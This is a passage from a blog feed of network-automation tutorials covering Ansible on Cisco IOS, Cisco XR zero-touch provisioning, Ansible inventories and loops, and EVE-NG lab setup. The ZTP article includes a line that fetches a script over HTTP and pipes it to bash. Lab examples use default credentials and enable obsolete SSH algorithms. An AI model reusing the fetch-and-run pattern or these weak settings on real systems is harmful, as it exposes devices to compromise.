we must be extremely precise in the commands we execute. With each change, Ansible will notify us with the following message: To ensure idempotency and correct diff the input configuration lines should be similar to how they appear if present in the running configuration on the device. Unlike the previous case, the configuration can be read from the running_config variable, allowing us to optimize complex playbooks. Due to how Cisco devices work, default commands are not shown in the configuration. Inserting, or better restoring a parameter to its default behavior means that Ansible will always declare the changed state. This is because the inserted (default) command will never be checked as present in the configuration. Therefore, we must manually manage this event. Due to how Cisco devices work, I cannot declare a list of NTP peers, but I have to add the missing ones and remove the necessary ones. Unlike the previous case, it is up to us to properly implement this behavior. A simplified approach that I call \u0026ldquo;blind\u0026rdquo; involves executing commands anyway, even if not necessary, such as removing a specific NTP peer. This approach certainly has the advantage of being simple and immediate, but requires anticipating all possible cases and always results in the changed state, thus nullifying the possibility of verifying \u0026ldquo;compliance\u0026rdquo;.\nThat said, our playbook must:\nadd the NTP peers that are present in the list but not present in the device configuration; remove the NTP peers that are present in the device configuration but not in the list. The first part is extremely simple:\n- cisco.ios.ios_config: lines: - \u0026#34;ntp peer {{ item }}\u0026#34; replace: line save_when: never with_items: \u0026#34;{{ ntp_peers }}\u0026#34; There are two parameters to pay attention to:\nreplace: takes line (default) or block as a value and defines how the configuration is applied. With line, individual commands not present in the configuration are sent, with block, all commands are sent even if one differs from the configuration. save_when: defines when the configuration is saved, and the values can be: always, never (default), modified, changed. We now need to remove the no longer necessary NTP peers. To do this, we must first extract all configured NTP servers:\n- ansible.builtin.set_fact: current_ntp_peers: \u0026#34;{{ running_config | regex_findall(\u0026#39;^ntp peer .*$\u0026#39;, multiline=True) | regex_replace(\u0026#39;ntp peer \u0026#39;, \u0026#39;\u0026#39;)}}\u0026#34; Finally, we can remove the unnecessary NTP servers, i.e., those that are configured but not present in the ntp_peers list:\n- cisco.ios.ios_config: lines: - \u0026#34;no ntp peer {{ item }}\u0026#34; running_config: \u0026#34;{{ running_config }}\u0026#34; replace: line save_when: never with_items: \u0026#34;{{ current_ntp_peers }}\u0026#34; when: item not in ntp_peers This approach allows us ample freedom but at the same time proves complex to manage nested block configurations (such as routing).\nSaving the configuration At this point, the devices will have the desired configuration, but it is not saved. To do this, we have three approaches:\nhandler: which allows us to \u0026ldquo;trigger\u0026rdquo; a task if it results in the changed state. This mode is the simplest but has a problem: if the playbook stops, there is no guarantee that the next execution will still report a changed state and consequently trigger the handler task. Always save the configuration at the end of the playbook: this approach is the simplest, however, for each execution, the configuration will be saved, and we will never have visibility of when the router configuration actually needs to be saved. Check if the running and startup configurations are different and, in this case, actually save the configuration. Let\u0026rsquo;s see first how to save the configuration:\n- cisco.ios.ios_command: commands: write memory We used write memory instead of the modern copy running-config startup-config because the former does not require confirmation, while the latter does: managing the confirmation would be an unnecessary complexity.\nThis task can be configured within the post_tasks, or called as a handler by all tasks that potentially modify the configuration.\nThe tasks become:\n- cisco.ios.ios_config: lines: - \u0026#34;ntp peer {{ item }}\u0026#34; replace: line save_when: never with_items: \u0026#34;{{ ntp_peers }}\u0026#34; notify: SAVING CONFIGURATION While the task to save the configuration must be configured as a handler, preferably within the handlers/main.yml file.\nOptimizing performance We must now optimize the configuration saving, only performing it if necessary. Procedurally, this means comparing the startup-config with the running-config, and, in case of differences, performing the save.\nLet\u0026rsquo;s see step by step how to proceed. Initially, we need to read the updated startup-config and running-config:\n- cisco.ios.ios_command: commands: show startup-config register: show_startup_config_output - cisco.ios.ios_command: commands: show running-config register: show_running_config_output We must then verify if the two configurations differ, net of some lines.\n- ansible.utils.fact_diff: before: \u0026#34;{{ show_startup_config_output.stdout[0] }}\u0026#34; after: \u0026#34;{{ show_running_config_output.stdout[0] }}\u0026#34; plugin: vars: skip_lines: - \u0026#34;^Current configuration.*\u0026#34; - \u0026#34;^Building configuration.*\u0026#34; register: config_differ We can then condition the saving of the configuration on the result of the previous task using config_differ.changed.\nA note of caution: the save process should only be done if the playbook is not in check mode (-C). Finally, we must remember that the save task should also be executed if the playbook is run including only some tags.\nConclusions Despite everything, it is preferable to use specialized modules, if bug-free and if they implement all the features we need. This also applies if we encounter performance problems. However, in my experience, it will often be necessary to use the generic configuration module to configure specific details not foreseen.\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2023/11/04/configuring-ntp-on-cisco-ios-with-ansible/","title":"Configuring NTP on Cisco IOS with Ansible"},{"categories":["automation"],"contents":"This article explores how to optimize the provisioning of a hundred Cisco XR devices so that they are configured with minimal human intervention. Depending on the context, the devices might be shipped directly from the factory and configured automatically on-site, or more likely, they could be automatically configured in a lab environment, verified, and then shipped for installation. We will rely on what is known as ZTP or Zero Touch Provisioning. The ZTP protocol allows configuring a factory-delivered device without any human intervention. ZTP is vendor-specific, and specifically on Cisco XR it requires:\nsetting up a DHCP server to assign an IP address to the devices; setting up a web server that generates configurations for each device; powering on the devices so they can acquire an IP address via DHCP and reach the web server. In the scenario we envision, we set up a lab environment where the devices will be unboxed, automatically configured, packaged, and shipped to the final destination, where non-technical personnel will proceed with physical installation, network cable connections, and power-on. We assume no technical skills at remote sites and no ability to send technical personnel.\nLet\u0026rsquo;s delve into the details.\nLab Network Configuration We set up a lab environment using a Linux system with two network interfaces: the first pnet0 will connect the system to the corporate network, and the second pnet9 will be connected to a dedicated and isolated network. The devices to be configured will then be connected to a dedicated physical switch, whose gateway is the pnet9 interface of the Linux system.\nOn the Linux system, we\u0026rsquo;ll use Dnsmasq configured as follows:\nport=0 interface=pnet9 dhcp-range=169.254.1.0,169.254.1.253,30d dhcp-option=67,http://169.254.1.1:8080/ztp log-dhcp Dnsmasq will serve the 169.254.1.0/24 network by assigning free IPs to clients and maintaining the assignment for 30 days. DHCP requests will include the URL for ZTP auto-configuration. DHCP requests will be logged via syslog, typically saved in /var/log/syslog.\nConfiguration Setup The web server, reachable at the configured address in the previous paragraph, must:\nmake a Bash script available to all devices; generate a specific configuration for each device; make the correct configuration available to each device. We\u0026rsquo;ll use Flask to create a small web application capable of dynamically generating configurations for each device. The application will respond to two URLs:\n/ztp (GET), which will make the Bash script available to Cisco XR devices; /config (POST), which will make the specific configuration available to each device that must send its serial number. Once ready, the Flask application can be run with:\nflask --app ztp run -p 8080 -h 169.254.1.1 Ensure the application is listening on the correct interface and that both URLs respond correctly:\nwget -q -O- http://169.254.1.1:8080/ztp wget -q -O- --post-data=\u0026#34;serial=1234\u0026#34; http://169.254.1.1:8080/config The /ztp URL will return text similar to the following, identical for all devices:\n#!/bin/bash export CONFIG_FILE=\u0026#34;/tmp/config.txt\u0026#34; source /pkg/bin/ztp_helper.sh SN=$(dmidecode | grep -m 1 \u0026#34;Serial Number:\u0026#34; | awk \u0026#39;{print $NF}\u0026#39;) PN=$(xrcmd \u0026#34;show inventory location 0/RP\u0026#34; | grep -m1 \u0026#34;PID\u0026#34; | awk \u0026#39;{print $2}\u0026#39;) RESULT=$(wget -O- --post-data=\u0026#34;serial=${SN}\u0026amp;model=${PN}\u0026#34; {{ url }} \u0026gt; $CONFIG_FILE) xrapply_with_reason \u0026#34;Initial ZTP configuration\u0026#34; $CONFIG_FILE After acquiring an IP via DHCP, the device will retrieve the described script. This script fetches the serial number (via dmidecode) and the model (via show inventory). Using these parameters, the device requests the second URL to use as its initial configuration.\nThe /config URL will return, based on the parameters passed in POST, the minimal configuration to make the device accessible via SSH:\nusername cisco group root-lr password 0 cisco ! hostname device01 ! domain name example.com ! vrf OOB address-family ipv4 unicast ! router static vrf OOB address-family ipv4 unicast 0.0.0.0/0 169.254.1.1 ! interface MgmtEth0/0/CPU0/0 vrf OOB ipv4 address 169.254.1.11 255.255.255.0 no shutdown ! ssh server v2 ssh server vrf OOB ! line default transport input ssh Power On and ZTP Process Verification We\u0026rsquo;ve reached the final but most critical step: powering on the device and verifying that the ZTP process works correctly. When starting a factory-new Cisco XR device, the ZTP process should start immediately after the cryptographic features legal notice:\nThis product contains cryptographic features and is subject to United States and local country laws governing import, export, transfer and use. Delivery of Cisco cryptographic products does not imply third-party authority to import, export, distribute or use encryption. Importers, exporters, distributors and users are responsible for compliance with U.S. and local country laws. By using this product you agree to comply with applicable laws and regulations. If you are unable to comply with U.S. and local laws, return this product immediately. A summary of U.S. laws governing Cisco cryptographic products may be found at: http://www.cisco.com/wwl/export/crypto/tool/stqrg.html If you require further assistance please contact us by sending email to export@cisco.com. RP/0/RP0/CPU0:Oct 18 08:11:22.659 UTC: ifmgr[363]: %PKT_INFRA-LINK-3-UPDOWN : Interface MgmtEth0/RP0/CPU0/0, changed state to Down RP/0/RP0/CPU0:Oct 18 08:11:22.661 UTC: ifmgr[363]: %PKT_INFRA-LINK-3-UPDOWN : Interface MgmtEth0/RP0/CPU0/0, changed state to Up RP/0/RP0/CPU0:Oct 18 08:11:29.975 UTC: pyztp2[330]: %INFRA-ZTP-4-CONFIG_INITIATED : ZTP has initiated config load and commit operations RP/0/RP0/CPU0:Oct 18 08:11:47.203 UTC: pyztp2[330]: %INFRA-ZTP-4-CONFIG_FINISHED : ZTP has finished config load and commit operations RP/0/RP0/CPU0:Oct 18 08:11:53.034 UTC: pyztp2[330]: %INFRA-ZTP-4-PROVISIONING_COMPLETED : ZTP has successfully completed the provisioning RP/0/RP0/CPU0:Oct 18 08:11:59.329 UTC: pyztp2[330]: %INFRA-ZTP-4-EXITED : ZTP exited If the ZTP process has worked correctly, the DHCP server will have assigned an IP:\n2023-10-18T11:32:42.306237+02:00 kali dnsmasq-dhcp[3818]: 548912439 vendor class: PXEClient:Arch:00009:UNDI:003010:PID:N540-ACC-SYS 2023-10-18T11:32:42.306699+02:00 kali dnsmasq-dhcp[3818]: 548912439 user class: xr-config 2023-10-18T11:32:42.306856+02:00 kali dnsmasq-dhcp[3818]: 548912439 DHCPDISCOVER(pnet9) 40:14:82:c1:11:11 2023-10-18T11:32:42.307036+02:00 kali dnsmasq-dhcp[3818]: 548912439 tags: pnet9 2023-10-18T11:32:42.307208+02:00 kali dnsmasq-dhcp[3818]: 548912439 DHCPOFFER(pnet9) 169.254.1.11 40:14:82:c1:11:11 2023-10-18T11:32:42.309068+02:00 kali dnsmasq-dhcp[3818]: 548912439 requested options: 1:netmask, 28:broadcast, 2:time-offset, 3:router, 2023-10-18T11:32:42.309925+02:00 kali dnsmasq-dhcp[3818]: 548912439 requested options: 15:domain-name, 6:dns-server, 12:hostname, 2023-10-18T11:32:42.310094+02:00 kali dnsmasq-dhcp[3818]: 548912439 requested options: 67:bootfile-name, 43:vendor-encap, 143 2023-10-18T11:32:42.310183+02:00 kali dnsmasq-dhcp[3818]: 548912439 next server: 169.254.1.1 2023-10-18T11:32:42.310289+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 1 option: 53 message-type 2 2023-10-18T11:32:42.310366+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 4 option: 54 server-identifier 169.254.1.1 2023-10-18T11:32:42.310433+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 4 option: 51 lease-time 30d 2023-10-18T11:32:42.310531+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 4 option: 58 T1 15d 2023-10-18T11:32:42.311451+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 4 option: 59 T2 26d6h 2023-10-18T11:32:42.311641+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 4 option: 1 netmask 255.255.255.0 2023-10-18T11:32:42.311775+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 4 option: 28 broadcast 169.254.1.255 2023-10-18T11:32:42.312018+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 4 option: 3 router 169.254.1.1 2023-10-18T11:32:42.312554+02:00 kali dnsmasq-dhcp[3818]: 548912439 sent size: 25 option: 67 bootfile-name http://169.254.1.1:8080/ztp And the web server will have been contacted on the two URLs:\n* Serving Flask app \u0026#39;ztp\u0026#39; * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://169.254.1.1:8080 Press CTRL+C to quit 169.254.1.11 - - [18/Oct/2023 14:47:06] \u0026#34;GET /ztp HTTP/1.1\u0026#34; 200 - 169.254.1.11 - - [18/Oct/2023 14:47:33] \u0026#34;POST /config HTTP/1.1\u0026#34; 200 - At this point, the device will be reachable and ready to be configured using secondary automation systems like Ansible.\nDevelopment and Troubleshooting The ZTP process described might appear simple and straightforward. However, it actually required several hours of testing to understand where and how the ZTP process was stalling. Let\u0026rsquo;s see what tools we have for troubleshooting.\nThe ZTP status can be seen using the show ztp status command:\nState : Terminated Current Fetcher : No active fetcher The ZTP process runs only if the router has factory settings; otherwise, it\u0026rsquo;s skipped. If our router isn\u0026rsquo;t factory-new, we have two options, both useful.\nWe can force the ZTP process from the command line:\nztp initiate Or we can, also from the command line, delete the configuration and reset ZTP:\nztp clean configure terminal commit replace reload ZTP process logs are stored on the device and can be viewed with show ztp logging. However, relying solely on these logs is inconvenient, considering that each boot takes several minutes. The best solution I found was to use the Bash available on Cisco XR devices and manually invoke the script:\nwget -O- http://169.254.1.1:8080/ztp | bash -x The above commands, typed from the console, open a Bash instance and execute the script made available by our developed application. Upon completion, the device should be configured as expected.\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2023/10/18/automatic-cisco-xr-provisioning-with-ztp/","title":"Automatic Cisco XR provisioning with ZTP"},{"categories":["automation"],"contents":"Ansible Navigator is a container-based textual interface designed to manage various components of Ansible. In essence, it serves as a wrapper, providing a unified interface to the Ansible ecosystem. Initially, the use of Ansible Navigator does not require container usage; thus, we will use the --ee=false parameter.\nAmong the modules of Ansible Navigator are:\nrun: Executes a playbook. replay: Displays the result of a previously executed playbook. inventory: Displays a specific Ansible inventory, describing hosts, groups, and variables. config: Displays the configuration of Ansible, describing individual parameters. settings: Displays the current configuration of Ansible Navigator, describing individual parameters. lint: Ensures proper formatting (linting) of playbooks and roles. Let\u0026rsquo;s explore practical usage of Ansible Navigator.\nRun: executing an Ansible Playbook An Ansible playbook can be executed using Ansible Navigator as follows:\nansible-navigator --ee=false run playbook-print_all_vars.yml -i inventory.yml Compared to the output of Ansible, Ansible Navigator provides significantly improved readability:\nPlay name Ok Changed Unreachable Failed Skipped Ignored In progress Task count Progress 0│PRINT DEBUG VARIABLES 6 0 0 0 0 0 0 6 Complete We can obtain playbook details using the line number (0 in our case) or : followed by the line number (:0 in our case).\nAdditionally, task lists and details can be viewed:\nResult Host Number Changed Task Task action Duration 0│Ok localhost 0 False Gathering Facts gather_facts 1s 1│Ok localhost 1 False PRINT MODULE VARIABLES (vars) ansible.builtin.debug 0s 2│Ok localhost 2 False PRINT ENVIRONMENT VARIABLES (environmeansible.builtin.debug 0s 3│Ok localhost 3 False PRINT GROUP NAMES VARIABLES (group_namansible.builtin.debug 0s 4│Ok localhost 4 False PRINT GROUPS VARIABLES (groups) ansible.builtin.debug 0s 5│Ok localhost 5 False PRINT HOST VARIABLES (hostvars) ansible.builtin.debug 0s Similarly, we can see the details of each task:\nPlay name: PRINT DEBUG VARIABLES:1 Task name: PRINT MODULE VARIABLES (vars) Ok: localhost [\u0026#39;-------------------------------------------------------------------------\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39; \u0026#34;a 0│--- ▒ 1│duration: 0.042759 2│end: \u0026#39;2023-10-06T11:39:11.611558\u0026#39; 3│event_loop: null 4│host: localhost 5│play: PRINT DEBUG VARIABLES 6│play_pattern: all 7│playbook: /Users/dainese/src/patreon/ansible/Recipes/playbook-print_all_vars.yml 8│remote_addr: localhost 9│res: 10│ _ansible_no_log: null 11│ _ansible_verbose_always: true 12│ changed: false 13│ msg: [...] Replay: review of a previous execution After each execution (run), Ansible Navigator creates a JSON file named artifact, allowing retrospective analysis of playbook execution.\nPrevious playbook data can be reloaded with:\nansible-navigator --ee=false replay playbook-print_all_vars-artifact-2023-10-06T11\\:39\\:11.912452+00\\:00.json The interface presents the same screen as shown in the previous paragraph (run).\nInventory: analysis of an inventory The inventory in Ansible is crucial in playbook execution. Many variables are defined at the inventory level. Ansible Navigator offers a tool to visualize inventory structure, groups, and group-level as well as host-level variables:\nansible-navigator --ee=false inventory -i inventory.yml Config: analysis of Ansible configuration Ansible can be configured using a large number of parameters. Sometimes it\u0026rsquo;s uncertain whether a specific parameter is configured correctly and therefore being ignored.\nWe can view the configuration of Ansible to verify configured parameters, their values, and where they can be configured:\nansible-navigator --ee=false config The output related to the host_key_checking parameter is as follows:\nHost key checking (current: False) (default: True) 0│--- 1│current_config_file: None 2│current_value: false 3│default: false 4│default_value: true 5│description: Set this to \u0026#34;False\u0026#34; if you want to avoid host key checking by the underlying 6│ tools Ansible uses to connect to the host 7│env: 8│- name: ANSIBLE_HOST_KEY_CHECKING 9│ini: 10│- key: host_key_checking 11│ section: defaults 12│name: Host key checking 13│option: HOST_KEY_CHECKING 14│source: env 15│type: boolean 16│via: ANSIBLE_HOST_KEY_CHECKING Settings: analysis of Ansible Navigator configuration Similarly, the configuration of Ansible Navigator can be analyzed:\nansible-navigator --ee=false settings Lint: formatting of playbooks and roles When we write code, regardless of the language, we encounter the challenge of adhering to standards: spacing, variable names, comments, and more. Linting is the process that allows us to conform to a recognized standard, whether automatically, semi-automatically, or manually.\nAnsible Navigator enables us to standardize our playbooks by performing linting:\nansible-navigator --ee=false lint *yml roles However, I recommend coupling Ansible Navigator with the following linters:\nyamllint *yml roles yamlfmt *yml roles ansible-lint ","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2023/10/06/ansible-navigator/","title":"Ansible Navigator"},{"categories":["automation"],"contents":"When working with Ansible, one of the \u0026ldquo;recipes\u0026rdquo; that I always keep handy is related to debugging variables. I find it particularly useful to have a comprehensive view of the variables associated with a host, defined at the \u0026ldquo;facts\u0026rdquo;, environment, group, and host levels.\nBy setting gather_facts: true, we can access the variables through:\nModule: vars Environment: environment Group names: group_names Groups: groups Hosts: hostvars To print the variables in a readable format, the to_nice_json filter can be used.\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2023/10/06/debug-all-variables-with-ansible/","title":"Debug all variables with Ansible"},{"categories":["automation"],"contents":"In this article, we\u0026rsquo;ll explore the two methods for defining an inventory usable by Ansible. The inventory serves as the source of truth containing the information that Ansible will use to connect to devices. The inventory also allows for defining variables at the host or group level. Specifically, variables can be used, in advanced scenarios, to define all infrastructure parameters, such as interfaces, IP addresses, router IDs\u0026hellip;\nAnsible supports both static and dynamic inventories. The static inventory is defined by a file in INI or YAML format, while the dynamic inventory is an executable that prints JSON to standard output.\nStatic Inventory in INI Format The static inventory in INI format follows the following structure:\n[all] r1.example.com ansible_host=169.254.1.21 [routers] r[1:9].example.com [routers:vars] ansible_user=admin ansible_ssh_pass=cisco ansible_connection=ansible.netcommon.network_cli ansible_network_os=cisco.ios.ios Static Inventory in YAML Format The static inventory in YAML format follows the following structure:\nall: hosts: r1.example.com: ansible_host: 169.254.1.21 routers: hosts: r[1:9].example.com: vars: ansible_user: admin ansible_ssh_pass: cisco ansible_connection: ansible.netcommon.network_cli ansible_network_os: cisco.ios.ios Dynamic Inventory in JSON Format As described earlier, the dynamic inventory must use the JSON format according to the following structure:\n{ \u0026#34;_meta\u0026#34;: { \u0026#34;hostvars\u0026#34;: { \u0026#34;r1.example.com\u0026#34;: { \u0026#34;ansible_host\u0026#34;: \u0026#34;169.254.1.21\u0026#34; } } }, \u0026#34;routers\u0026#34;: { \u0026#34;hosts\u0026#34;: [ \u0026#34;r1.example.com\u0026#34; ], \u0026#34;vars\u0026#34;: { \u0026#34;ansible_connection\u0026#34;: \u0026#34;ansible.netcommon.network_cli\u0026#34;, \u0026#34;ansible_network_os\u0026#34;: \u0026#34;cisco.ios.ios\u0026#34;, \u0026#34;ansible_ssh_pass\u0026#34;: \u0026#34;cisco\u0026#34;, \u0026#34;ansible_user\u0026#34;: \u0026#34;admin\u0026#34; } } } ","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2023/09/30/ansible-inventory/","title":"Ansible inventory"},{"categories":["automation"],"contents":"In the realm of automation, each laboratory we will create requires a feature as basic as it is essential: the IP addresses of the devices must be accessible from the automation system. While the EVE-NG PRO version offers a native feature (NAT Cloud) that simplifies this process, with EVE-NG CE we need to devise a strategy to achieve the same outcome.\nOur goal is to configure an additional network on EVE-NG that allows us to connect the management interfaces of the devices we will use for our labs, whether they are virtual (internal to EVE-NG) or physical (PLCs and other external physical devices). The diagram below (attached1) summarizes our objective:\nEVE-NG Networking First and foremost, we need to understand how networking works in EVE-NG, and this provides an opportunity to introduce some Linux concepts in general.\nIn a Linux system, network interfaces are represented by various names, typically prefixed with \u0026ldquo;eth\u0026rdquo; or \u0026ldquo;ens\u0026rdquo; followed by an identifier number. These interfaces can represent either physical network cards or virtual network cards. In our environment, we\u0026rsquo;ll find that the physical network card is represented by eth0, while there are other network cards named pnet.\nWe can view the network interfaces of the system using one of the following commands:\nifconfig -a ip link The configured pnet interfaces are actually virtual switches (bridges) set up by default during installation:\nsudo brctl show bridge name bridge id STP enabled interfaces pnet0 8000.0050568a6a54 no eth0 pnet1 8000.000000000000 no pnet2 8000.000000000000 no pnet3 8000.000000000000 no pnet4 8000.000000000000 no pnet5 8000.000000000000 no pnet6 8000.000000000000 no pnet7 8000.000000000000 no pnet8 8000.000000000000 no pnet9 8000.000000000000 no In particular, we see that the bridge pnet0 is associated with the physical interface eth0. In other words, anything associated with the bridge pnet0 will also be transmitted over the network eth0. As we\u0026rsquo;ll see in the web interface, we can add Cloud networks. Cloud networks are nothing but the pnet bridges. Specifically, the pnet0 network is also used for web access. In fact, the management IP address is associated with the bridge pnet0, as we can see using one of the following commands:\nifconfig pnet0 ip address show pnet0 We can then configure an IP address on the pnet9 network and connect the management interfaces of the devices to the Cloud9 network.\nEVE-NG, che è basata su Ubuntu 20, configura le reti tramite il file /etc/network/interfaces. In particolare dobbiamo configurare la parte relativa al bridge pnet9 come segue:\n# Cloud devices auto pnet9 iface pnet9 inet static address 169.254.1.1 netmask 255.255.255.0 bridge_ports none bridge_stp off We use the APIPA network, which is defined to be local. In this sense, within an enterprise context, we have a reasonable certainty of not overlapping with other networks. The remaining interfaces pnet2-9 can be deleted.\nWe can now reload the modified network configuration:\nsudo /etc/init.d/networking restart If we ever want to associate a physical interface with this bridge, we need to add the line:\nbridge_ports eth1 Enabling DHCP For convenience, we choose to automatically assign IP addresses to the network interfaces connected to the Cloud9 network. To do this, we use the DHCP protocol via Dnsmasq.\nsudo apt-get update sudo apt-get install -y dnsmasq The configuration of Dnsmasq) is done through the configuration file /etc/dnsmasq.conf. Specifically, we want to have only the DHCP service active and only for the network managed by the interface pnet9. The configuration is as follows:\nport=0 interface=pnet9 dhcp-range=169.254.1.2,169.254.1.254,3650d log-dhcp Finally, restart the service with:\nsudo systemctl restart dnsmasq As we\u0026rsquo;ll see later for the automation part, we need a stable association between the IP addresses of the devices and the devices themselves. Therefore, we cannot rely on a dynamic mapping provided by Dnsmasq, but we must define it statically. We can map the hostname with which the device will present itself during the DHCP request and statically map it to Dnsmasq:\ndhcp-host=SW1,169.254.1.101 dhcp-host=SW2,169.254.1.102 dhcp-host=SW3,169.254.1.103 dhcp-host=SW4,169.254.1.104 The list should be completed with all the names we will use in this and future labs.\nAccessing the Internet To complete our environment, the Cloud9 network must be able to access the Internet. In other words, outgoing traffic must be masked (via NAT) using the IP address configured on the pnet0 interface.\nFirst, we need to enable routing by modifying the file /etc/sysctl.conf:\nnet.ipv4.ip_forward=1 Enable the setting by executing:\nsudo sysctl -p Then, configure NAT using IPTables to mask outgoing traffic with the address of pnet0:\nsudo iptables -t nat -A POSTROUTING -o pnet0 -j MASQUERADE To save the changes, use:\nsudo apt-get install -y iptables-persistent sudo iptables-save \u0026gt; /etc/iptables/rules.v4 Although not necessary, it\u0026rsquo;s recommended to reboot the system to ensure everything is configured correctly.\nSupported Devices EVE-NG supports a wide range of devices and is generally capable of running almost any x86-based device. For more information, refer to the Supported images containing the list of supported devices.\nFor lab portability, and thus for easy lab usage, it\u0026rsquo;s important to use the correct name. Otherwise, you will need to modify the lab by assigning the correct images before launching it.\nCopy the contents of the iol directory to the directory /opt/unetlab/addons/iol. This can be done using PuTTY or WinSCP (Windows) or directly with SSH (Mac):\nscp i86bi_linux_l- root@172.25.82.222:/opt/unetlab/addons/iol/bin/ scp iourc root@172.25.82.222:/opt/unetlab/addons/iol/bin/ Then, on the EVE-NG machine, execute:\nsudo /opt/unetlab/wrappers/unl_wrapper -a fixpermissions Creare il primo laboratorio The final step is to create the first actual laboratory. Connect to the EVE-NG machine via Web by selecting the Html5 console mode at login:\nGo to Add new lab; Add a network by going to Add an object -\u0026gt; Network on the right Add an IOL node by going to Add an object -\u0026gt; Node Connect router R1:e0/0 to the Internet network Start router R1 by going to More actions -\u0026gt; Start all nodes on the right Then, access the console of router R1 and configure it as follows:\nusername admin privilege 15 password cisco hostname R1 ip domain-name example.com interface Ethernet0/0 ip address dhcp no shutdown crypto key generate rsa modulus 2048 ip ssh version 2 line vty 0 4 transport input ssh login local If our environment configuration has been done correctly, we should:\nSee an IP address configured on R1:e0/0 Be able to connect to R1 from the EVE-NG machine When connecting to R1 via SSH, we might encounter the following error:\nUnable to negotiate with 169.254.1.186 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 The reason is that the image used by R1 is outdated and still uses protocols considered obsolete and insecure. On the EVE-NG machine, we need to enable in the file /root/.ssh/config some obsolete and insecure configurations (to be done in a test environment but not in production):\nKexAlgorithms diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 HostKeyAlgorithms ssh-rsa,ssh-dss Host * ServerAliveInterval 5 ServerAliveCountMax 3 At this point, we should be able to connect to R1 via SSH.\nThe final test that validates our environment is to ping from R1 to an Internet address, for example, 8.8.8.8:\nR1#ping 8.8.8.8 Type escape sequence to abort. Sending 5, 100-byte ICMP Echos to 8.8.8.8, timeout is 2 seconds: !!!!! Success rate is 100 percent (5/5), round-trip min/avg/max = 11/11/12 ms ","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2023/09/30/set-up-the-first-laboratory-on-eve-ng/","title":"Set up the first laboratory on EVE-NG"},{"categories":["automation"],"contents":"In my opinion, one of the less understandable constructs in Ansible concerns loop management. If we then talk about nested loops, the situation becomes even more complex. In this short post, we\u0026rsquo;ll see the recipes for:\nlooping over a list; looping over a dictionary; nested loops. Looping Over a List The simplest loop involves using a list and performing a series of actions on each element, by default item:\n- ansible.builtin.debug: msg: \u0026#34;Now reading {{ item }}\u0026#34; with_items: \u0026#34;{{ list1 }}\u0026#34; As we can see, within the loop, the element is accessible through the variable item.\nLooping Over a Dictionary If we\u0026rsquo;re looping (it wouldn\u0026rsquo;t be the correct term) over a dictionary, we\u0026rsquo;ll likely need to access both the key and the value. The syntax is similar to the previous case:\n- ansible.builtin.debug: msg: \u0026#34;Now reading {{ item.key }} by {{ item.value }}\u0026#34; with_dict: \u0026#34;{{ dict1 }}\u0026#34; In this case, we see that the key is accessible through item.key while the associated value is accessible through item.value.\nNested Loops If we need to use nested loops, the syntax becomes more complex, and we\u0026rsquo;ll need to rely on external files. Let\u0026rsquo;s see the syntax:\n- ansible.builtin.include_tasks: sub_task1.yml with_items: \u0026#34;{{ list1 }}\u0026#34; loop_control: loop_var: outer_item For each element in the list list1, the playbook will execute the tasks contained in the file sub_task1.yml. In the execution of the subtasks, the current element is accessible through the variable outer_item:\n- ansible.builtin.debug: msg: \u0026#34;Now reading {{ outer_item }} from outer loop\u0026#34; In the same file, we can perform another loop by calling a third file:\n- ansible.builtin.include_tasks: sub_task2.yml with_items: \u0026#34;{{ list2 }}\u0026#34; loop_control: loop_var: inner_item The file sub_task2.yml defines the tasks that will use the variables from the first (outer) and second (inner) loop:\n- ansible.builtin.debug: msg: \u0026#34;Now reading {{ outer_item}} / {{ inner_item }} from inner loop\u0026#34; ","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2023/09/29/loops-and-nested-loops-with-ansible/","title":"Loops and nested loops with Ansible"},{"categories":["automation"],"contents":"I have been involved in automation since around 2004, when I was managing nearly 200 nodes on the AlphaServer. Specifically, I was responsible for the hardware aspect. It may seem straightforward, but it\u0026rsquo;s important to consider that there was a mini operating system running under Unix that checked the connected components, detecting both critical and non-critical errors. Identifying non-critical errors as soon as possible meant being able to plan a shutdown to replace the failing component, thus saving a night of work.\nThe automation I had created at that time was a script that, via SSH, accessed various instances of Tru64 Unix, executed diagnostic tools, retrieved detected errors, categorized them according to their criticality, and made them available for review.\nLater, around 2007, I found myself frequently managing Linux system installations. Replacing DVD installations with an automatic system meant saving several hours of work on a weekly basis. So, I decided to use PXE, through which, upon system boot, physical or virtual, the Linux installer was loaded, installing the base of the operating system according to some predefined \u0026ldquo;standard\u0026rdquo; parameters (we\u0026rsquo;ll understand the meaning of the quotation marks later).\nThese Linux systems then needed to be customized based on their role, by installing specific packages and configurations. After trying CFEngine and Puppet, I chose the latter, which, although newly released, seemed less complicated.\nLater on, I shifted to network management, handling dozens of Cisco routers. These routers contained access lists used to filter and classify traffic based on required QoS. There were some small modifications to these access lists to be made weekly. The automation I created was based on Expect, which, via SSH, connected to the various routers and replaced (updated) the access lists. Netmiko and Ansible were still dreams of those who would develop them.\nIn 2011, for personal study needs, I needed to automate the creation of network laboratories, which led to the birth of UnetLab, now managed under the name of EVE-NG, which forms the basis of our laboratory.\nSubsequent experiences in automation include:\nAutomating PANW firewall policies to enable remote access to industrial devices during specific maintenance windows (the project was then entirely rewritten as FWAdmin, a plugin for NetBox); Automating network discovery and generating part of the documentation (the project evolved over time and is now released as NetDoc, a plugin for NetBox); Migrating a data center to Cisco ACI technology (I developed Python scripts that directly invoked the APIs); Generating a 